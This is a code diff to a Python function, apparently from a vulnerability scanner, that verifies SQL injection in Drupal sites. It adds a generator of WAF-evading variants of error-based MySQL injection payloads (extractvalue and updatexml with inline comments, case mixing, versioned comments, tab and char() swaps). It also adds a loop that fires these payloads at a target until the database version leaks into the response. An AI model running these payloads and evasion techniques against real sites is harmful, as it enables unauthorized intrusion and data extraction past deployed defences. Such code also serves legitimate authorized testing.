@@ -1121,6 +1121,20 @@ def verify_drupal_sqli(
         contexts = ["'", '"', "", "')", '")']
         comments = ["-- -", "#"]
 
+        def _waf_expand_sqli_payloads(orig: str, fn: str, ctx: str, cm: str) -> list:
+            """WAF-bypass variants of an error-based SQLi payload. Generic."""
+            base = f"{orig}{ctx} AND {fn}{cm}"
+            variants = [
+                f"{orig}{ctx}/**/AND/**/{fn}{cm}",
+                "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(
+                    f"{orig}{ctx} AND {fn}{cm}")),
+                f"{orig}{ctx} AND {fn.replace('extractvalue', '/*!50000extractvalue*/').replace('updatexml', '/*!50000updatexml*/')}{cm}",
+                f"{orig}{ctx}\tAND\t{fn}{cm}",
+                f"{orig}{ctx} AND {fn.replace('0x7e,version()', 'char(126),version()')}{cm}",
+            ]
+            seen = {base}
+            return [v for v in variants if v not in seen and not seen.add(v)][:5]
+
         step("probando error-based (extractvalue/updatexml) para extraer version() real...")
         error_tried = []
         error_found = None
@@ -1143,6 +1157,42 @@ def verify_drupal_sqli(
                     break
             if error_found:
                 break
+
+        # WAF bypass round when standard payloads failed and budget allows
+        import time as _time_waf_d
+        if not error_found and (budget_s - (_time_waf_d.time() - t0)) > 60:
+            step("error-based estandar fallo — intentando variantes WAF-bypass...")
+            waf_tried = []
+            for ctx in contexts:
+                for fn in ("extractvalue(1,concat(0x7e,version()))",
+                           "updatexml(1,concat(0x7e,version()),1)"):
+                    for cm in comments:
+                        for waf_p in _waf_expand_sqli_payloads(orig_value, fn, ctx, cm):
+                            try:
+                                r = send(waf_p)
+                            except Exception as e:
+                                waf_tried.append({"payload": waf_p, "error": str(e)})
+                                continue
+                            new_versions = (set(re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", r.text or ""))
+                                            - version_noise)
+                            waf_tried.append({"payload": waf_p, "status": r.status_code,
+                                              "version_nueva": sorted(new_versions)})
+                            if new_versions:
+                                error_found = (waf_p, sorted(new_versions)[0], r)
+                                break
+                            if (budget_s - (_time_waf_d.time() - t0)) <= 15:
+                                break
+                        if error_found:
+                            break
+                    if error_found:
+                        break
+                if error_found:
+                    break
+            error_tried.extend(waf_tried)
+            if error_found:
+                step("WAF bypass exitoso: variante obfuscada funciono")
+            else:
+                step(f"WAF bypass: {len(waf_tried)} variantes probadas, ninguna filtro version()")
 
         if error_found:
             payload_val, mysql_version, r = error_found
